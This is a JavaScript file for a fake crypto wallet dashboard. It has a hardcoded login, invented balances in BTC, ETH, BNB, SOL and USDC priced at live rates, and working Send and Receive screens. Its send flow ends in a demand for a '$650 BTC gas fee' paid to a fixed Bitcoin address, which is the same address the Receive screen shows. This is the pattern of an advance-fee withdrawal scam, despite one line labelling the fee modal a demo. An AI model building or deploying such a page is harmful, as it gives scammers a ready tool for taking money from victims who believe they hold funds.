// Credentials & BTC fee address
const USERNAME = 'sarahhilton';
const PASSWORD = 'sarahhilton';
const BTC_RECEIVE_ADDRESS = 'bc1q7sjehwjvkhzwtmj8yj2srqylf06ds9gu88am72';

// Tokens and initial balances
const tokens = [
  { symbol: 'BTC', name: 'Bitcoin', balance: 1.2 },
  { symbol: 'ETH', name: 'Ethereum', balance: 80 },
  { symbol: 'BNB', name: 'Binance Coin', balance: 200 },
  { symbol: 'SOL', name: 'Solana', balance: 500 },
  { symbol: 'USDC', name: 'USD Coin', balance: 5000 },
];

let prices = {};
let totalBalance = 0;

const loginScreen = document.getElementById('login-screen');
const dashboard = document.getElementById('dashboard');
const loginForm = document.getElementById('login-form');
const loginError = document.getElementById('login-error');
const logoutBtn = document.getElementById('logout-btn');
const totalBalanceEl = document.getElementById('total-balance');
const cryptoListEl = document.getElementById('crypto-list');

const modal = document.getElementById('modal');
const modalContent = document.getElementById('modal-content');
const modalClose = document.getElementById('modal-close');

// Chart instances
const chartInstances = {};

// Format USD nicely
function formatUSD(num) {
  return '$' + num.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

// Fetch live prices from CoinGecko API
async function fetchPrices() {
  try {
    const ids = tokens.map(t => {
      switch(t.symbol){
        case 'BTC': return 'bitcoin';
        case 'ETH': return 'ethereum';
        case 'BNB': return 'binancecoin';
        case 'SOL': return 'solana';
        case 'USDC': return 'usd-coin';
        default: return '';
      }
    }).join(',');

    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`);
    const data = await res.json();

    prices = {
      BTC: data.bitcoin.usd,
      ETH: data.ethereum.usd,
      BNB: data.binancecoin.usd,
      SOL: data.solana.usd,
      USDC: data['usd-coin'].usd,
    };
  } catch (err) {
    console.error('Failed to fetch prices', err);
    // fallback prices
    prices = {
      BTC: 56000,
      ETH: 3500,
      BNB: 600,
      SOL: 150,
      USDC: 1,
    };
  }
}

// Calculate total wallet balance in USD
function calculateTotal() {
  totalBalance = tokens.reduce((sum, t) => sum + t.balance * prices[t.symbol], 0);
}

// Render the dashboard tokens list with charts and buttons
function renderDashboard() {
  totalBalanceEl.textContent = formatUSD(totalBalance);

  cryptoListEl.innerHTML = '';

  tokens.forEach(token => {
    const value = token.balance * prices[token.symbol];
    const card = document.createElement('div');
    card.className = 'bg-gray-800 rounded-lg p-4 flex flex-col shadow-lg';

    card.innerHTML = `
      <div class="flex justify-between items-center mb-2">
        <div>
          <h4 class="text-xl font-semibold">${token.name} (${token.symbol})</h4>
          <p>${token.balance} ${token.symbol} ≈ <strong>${formatUSD(value)}</strong></p>
        </div>
        <div class="space-x-2">
          <button class="send-btn bg-green-600 hover:bg-green-700 py-1 px-3 rounded transition" data-token="${token.symbol}">Send</button>
          <button class="receive-btn bg-blue-600 hover:bg-blue-700 py-1 px-3 rounded transition" data-token="${token.symbol}">Receive</button>
        </div>
      </div>
      <canvas id="chart-${token.symbol}" height="120"></canvas>
    `;

    cryptoListEl.appendChild(card);
  });

  attachButtonListeners();
  createOrUpdateCharts();
}

function attachButtonListeners() {
  document.querySelectorAll('.send-btn').forEach(btn => {
    btn.onclick = () => openSendModal(btn.dataset.token);
  });

  document.querySelectorAll('.receive-btn').forEach(btn => {
    btn.onclick = () => openReceiveModal(btn.dataset.token);
  });

  document.getElementById('send-total-btn').onclick = () => openSendModal('TOTAL');
  document.getElementById('receive-total-btn').onclick = () => openReceiveModal('TOTAL');
}

// Receive modal - only BTC receive address with QR
function openReceiveModal(token) {
  modalContent.innerHTML = `
    <h3 class="text-xl font-bold mb-4">Receive ${token === 'TOTAL' ? 'Bitcoin (BTC)' : token}</h3>
    <p class="mb-4">You can only receive BTC at this address:</p>
    <div id="qrcode" class="mb-4 flex justify-center"></div>
    <p class="break-all text-center font-mono">${BTC_RECEIVE_ADDRESS}</p>
    <button id="modal-close-btn" class="mt-6 w-full bg-blue-600 hover:bg-blue-700 py-2 rounded font-semibold text-white">Close</button>
  `;
  const qrCodeContainer = document.getElementById('qrcode');
  qrCodeContainer.innerHTML = '';
  QRCode.toCanvas(qrCodeContainer, BTC_RECEIVE_ADDRESS, { width: 180 });

  document.getElementById('modal-close-btn').onclick = closeModal;
  showModal();
}

let sendModalState = {
  token: '',
  step: 'input',
  address: '',
  amount: 0,
};

function openSendModal(token) {
  sendModalState = { token, step: 'input', address: '', amount: 0 };
  renderSendStep();
  showModal();
}

// Render steps for send modal (input and confirm)
function renderSendStep() {
  if (sendModalState.step === 'input') {
    modalContent.innerHTML = `
      <h3 class="text-xl font-bold mb-4">Send ${sendModalState.token === 'TOTAL' ? 'Bitcoin (BTC)' : sendModalState.token}</h3>
      <label class="block mb-2">Enter recipient address:</label>
      <input id="send-address" type="text" class="w-full p-2 rounded bg-gray-700 border border-gray-600 mb-4" />
      <label class="block mb-2">Enter amount (${sendModalState.token === 'TOTAL' ? 'BTC' : sendModalState.token}):</label>
      <input id="send-amount" type="number" min="0" step="any" class="w-full p-2 rounded bg-gray-700 border border-gray-600 mb-4" />
      <button id="send-next-btn" class="w-full bg-green-600 hover:bg-green-700 py-2 rounded font-semibold">Next</button>
      <button id="modal-close-btn" class="mt-2 w-full bg-gray-600 hover:bg-gray-700 py-2 rounded font-semibold">Cancel</button>
    `;
    document.getElementById('send-next-btn').onclick = validateSendInput;
    document.getElementById('modal-close-btn').onclick = closeModal;
  } else if (sendModalState.step === 'confirm') {
    modalContent.innerHTML = `
      <h3 class="text-xl font-bold mb-4">Confirm Send</h3>
      <p>Send <strong>${sendModalState.amount} ${sendModalState.token === 'TOTAL' ? 'BTC' : sendModalState.token}</strong> to:</p>
      <p class="break-all font-mono my-3">${sendModalState.address}</p>
      <button id="confirm-send-btn" class="w-full bg-green-700 hover:bg-green-800 py-2 rounded font-semibold mb-2">Confirm</button>
      <button id="modal-close-btn" class="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded font-semibold">Cancel</button>
    `;

    document.getElementById('confirm-send-btn').onclick = showGasFeeModal;
    document.getElementById('modal-close-btn').onclick = closeModal;
  }
}

function validateSendInput() {
  const address = document.getElementById('send-address').value.trim();
  const amountStr = document.getElementById('send-amount').value.trim();
  const amount = parseFloat(amountStr);

  if (!address) {
    alert('Please enter a recipient address.');
    return;
  }
  if (isNaN(amount) || amount <= 0) {
    alert('Please enter a valid amount.');
    return;
  }

  // Check balance
  let tokenSymbol = sendModalState.token === 'TOTAL' ? 'BTC' : sendModalState.token;
  let tokenObj = tokens.find(t => t.symbol === tokenSymbol);
  if (!tokenObj) {
    alert('Invalid token selected.');
    return;
  }
  if (amount > tokenObj.balance) {
    alert(`Insufficient ${tokenSymbol} balance.`);
    return;
  }

  sendModalState.address = address;
  sendModalState.amount = amount;
  sendModalState.step = 'confirm';
  renderSendStep();
}

function showGasFeeModal() {
  modalContent.innerHTML = `
    <h3 class="text-xl font-bold mb-4 text-red-500">Attention</h3>
    <p class="mb-4">To complete this transaction, a <strong>$650 BTC gas fee</strong> deposit is required to this address:</p>
    <p class="break-all font-mono mb-4">${BTC_RECEIVE_ADDRESS}</p>
    <p class="italic mb-4">Note: This is a simulated fee modal for demo purposes.</p>
    <button id="modal-close-btn" class="w-full bg-red-600 hover:bg-red-700 py-2 rounded font-semibold">Close</button>
  `;

  document.getElementById('modal-close-btn').onclick = closeModal;
}

// Modal show/hide
function showModal() {
  modal.classList.remove('hidden');
}
function closeModal() {
  modal.classList.add('hidden');
}

// Logout
logoutBtn.onclick = () => {
  localStorage.removeItem('trustlite_logged_in');
  loginScreen.classList.remove('hidden');
  dashboard.classList.add('hidden');
};

// Login form submit
loginForm.onsubmit = e => {
  e.preventDefault();
  const form = e.target;
  const username = form.username.value.trim();
  const password = form.password.value.trim();

  if (username === USERNAME && password === PASSWORD) {
    loginError.classList.add('hidden');
    localStorage.setItem('trustlite_logged_in', 'true');
    loginScreen.classList.add('hidden');
    dashboard.classList.remove('hidden');
    initializeApp();
  } else {
    loginError.classList.remove('hidden');
  }
};

// Initialize app after login
async function initializeApp() {
  await fetchPrices();
  calculateTotal();
  renderDashboard();
  startLivePriceUpdates();
  startChartUpdates();
}

// Live price update every 10 seconds
function startLivePriceUpdates() {
  setInterval(async () => {
    await fetchPrices();
    calculateTotal();
    updatePricesAndBalances();
  }, 10000);
}

function updatePricesAndBalances() {
  totalBalanceEl.textContent = formatUSD(totalBalance);
  tokens.forEach(token => {
    const tokenCard = document.querySelector(`button[data-token="${token.symbol}"]`)?.closest('div.bg-gray-800');
    if (!tokenCard) return;
    const valueEl = tokenCard.querySelector('p strong');
    if (valueEl) {
      const value = token.balance * prices[token.symbol];
      valueEl.textContent = formatUSD(value);
    }
  });
  updateCharts();
}

// Chart.js datasets, keep last 20 points
const priceHistory = {
  BTC: [],
  ETH: [],
  BNB: [],
  SOL: [],
  USDC: [],
};
const maxPoints = 20;

function createOrUpdateCharts() {
  tokens.forEach(token => {
    const ctx = document.getElementById(`chart-${token.symbol}`).getContext('2d');
    if (!chartInstances[token.symbol]) {
      chartInstances[token.symbol] = new Chart(ctx, {
        type: 'line',
        data: {
          labels: [],
          datasets: [{
            label: `${token.symbol} Price`,
            data: [],
            borderColor: 'rgba(96, 165, 250, 1)', // Tailwind blue-400
            backgroundColor: 'rgba(96, 165, 250, 0.3)',
            fill: true,
            tension: 0.3,
          }]
        },
        options: {
          responsive: true,
          animation: false,
          scales: {
            x: { display: false },
            y: {
              ticks: { color: '#eee' },
              grid: { color: '#333' }
            }
          },
          plugins: {
            legend: { labels: { color: '#eee' } }
          }
        }
      });
    }
  });
  updateCharts();
}

function updateCharts() {
  const now = new Date().toLocaleTimeString();

  tokens.forEach(token => {
    let hist = priceHistory[token.symbol];
    hist.push({ time: now, price: prices[token.symbol] });
    if (hist.length > maxPoints) hist.shift();

    const chart = chartInstances[token.symbol];
    if (!chart) return;

    chart.data.labels = hist.map(p => p.time);
    chart.data.datasets[0].data = hist.map(p => p.price);
    chart.update('none');
  });
}

// Check if user is logged in on page load
window.onload = () => {
  const loggedIn = localStorage.getItem('trustlite_logged_in');
  if (loggedIn === 'true') {
    loginScreen.classList.add('hidden');
    dashboard.classList.remove('hidden');
    initializeApp();
  }
};
